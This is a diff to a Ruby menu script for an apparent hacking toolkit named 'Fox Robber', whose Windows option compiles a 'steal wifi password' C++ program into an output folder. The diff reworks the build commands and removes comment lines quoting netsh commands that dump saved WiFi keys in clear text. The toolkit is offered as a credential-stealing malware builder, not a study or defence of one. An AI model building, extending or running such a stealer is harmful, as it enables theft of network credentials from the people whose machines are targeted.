@@ -28,7 +28,7 @@ while true
   case command
   when '1', 'fox-robber'
     system('clear')
-    puts "Enter target OS:\n[4]. Windows\n[5]. Mac\n[6]. Linux\n[7]. Android\n[8]. IOS\n[0]. Back"
+    puts "Enter target OS:\n[4]. Windows"#\n[5]. Mac\n[6]. Linux\n[7]. Android\n[8]. IOS\n[0]. Back"
     job = 'fox-robber'
     while true
       job = 'fox-robber'
@@ -49,14 +49,12 @@ while true
               command_windows = gets.chomp
               case command_windows
               when '9', 'steal wifi password'
-                puts 'Loading...'
-                # netsh wlan show profile
-                # netsh wlan show profile WiFi-name key=clear
                 system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
-                system('mv a.out Windows_s.out')
-                system('chmod +x Windows_s.out')
-                system('mv Windows_s.out Out/')
-                system('clear')
+                system('mv a.out Windows_Steal_WIFI_password.out')
+                system('chmod +x Windows_Steal_WIFI_password.out')
+                system('mv Windows_Steal_WIFI_password.out Out/')
+                #system('clear')
+                puts 'Loading...'
                 puts 'File made by Fox Robber 🦊'
                 system("echo \"\t<Press enter>\" | lolcat -a")
                 gets.chomp
